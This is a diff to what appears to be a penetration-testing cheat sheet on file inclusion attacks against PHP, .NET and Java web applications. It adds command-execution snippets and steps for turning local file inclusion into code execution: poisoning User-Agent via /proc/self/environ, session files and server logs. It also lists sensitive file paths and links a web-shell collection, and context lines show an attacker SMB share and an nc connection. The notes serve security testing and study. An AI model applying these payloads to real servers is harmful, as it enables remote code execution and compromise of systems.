@@ -82,6 +82,13 @@ include()
 //Defense: Using Input - traeats POST data as a file.  Create php_input_exploit.html, open it with firefox and submit the form
 <form action="http://blog.site.org/fileview.php?loc=php://input" method="post" enctype="text/plain">
 <input type="text" name="exploit" value="<?php phpinfo(); ?>" />
+  
+//System Commands:
+<?php passthru(".."); ?> 
+<?php system(".."); ?>
+
+//Write files to /var/www/
+fopen and fwrite
 {% endhighlight %}
 
 {% highlight C# %}
@@ -97,6 +104,12 @@ Server.Execute()
 
 //RFI .net on windowsusing SMB/CIFS
 \\attacker\mal\malicious.txt
+
+//System Commands
+<% Shell("...") %>
+
+//Write Files to C;\\inetpub\wwwroot
+FileSystemObject
 {% endhighlight %}
 
 {% highlight java %}
@@ -200,6 +213,72 @@ exploit
 
 **LFI Shell:**
 
+Must have the following:
+* The application or server writes to a file
+* The contents of the file can be controlled
+* The web server has permission to read the file
+
+Examples:
+* A blog, wiki, or CMS that creates entries as files
+* An e-mail server with e-mails as files
+* An FTP server with anonymous upload
+* The application supports file uploads
+
+Possible Methods:
+* Application specific files (e.g., file-based blog)
+* Server Specific Files (e-mail server, FTP, and so on)
+* File upload (even when not in web root)
+* PHP session files
+* Log files (applicaiton, Apache, SSH, or other)
+
+Linux:
+
+* /proc/self/environ - Environment variables (e.g., user agent)
+
+{% highlight bash %}
+#Change User-Agent: <?php phpinfo(); ?>
+#Brute force a file number
+GET /fileview.php?loc=/proc/self/environ
+{% endhighlight %}
+
+* /proc/self/fd/# - Currently open file streams (number over 2)
+
+{% highlight bash %}
+#Upload a file
+#Brute force a file number
+GET /fileview.php?loc=/proc/self/fd/$number$
+{% endhighlight %}
+
+* /proc/self/cmdline - Command line invocation
+
+Linux PHP Session:
+
+File named sess_[session id]
+* /tmp
+* /var/lib/php5
+* /var/lib/php/session
+* ../temp
+
+
+Windows PHP Session:
+
+* PHP saves session data in C:\Windows\Temp
+
+Exploitiong Session Files:
+{% highlight bash %}
+# Find Session ID (e.g., PHPSESSID)
+# Navigate to http://blog.name.org/fileview.php?loc=/var/lib/php5/sess_[sessionID] (or similar URL)
+# Find an controllable session field and update it with PHP code
+# Navigate to http://blog.name.org/fileview.php?loc=/var/lib/php5/sess_[sessionID] (or similar URL)
+{% endhighlight %}
+
+
+Linux Server Logs:
+
+* Web server log: /var/log/httpd/access_log (URI and User Agent)
+* System Authentication Logs: /var/log/auth.log (SSH, FTP,...)
+* Read vendor documentation for framework
+
 {% highlight bash %}
 #From logs
 nc -nv 192.168.1.2 80
@@ -253,6 +332,7 @@ Online:
 
 > **Useful Resources**
 
+* [Shells](http://laudanum.sourceforge.net)
 * [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
 * [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
 * [websec](https://websec.ca/kb/sql_injection)
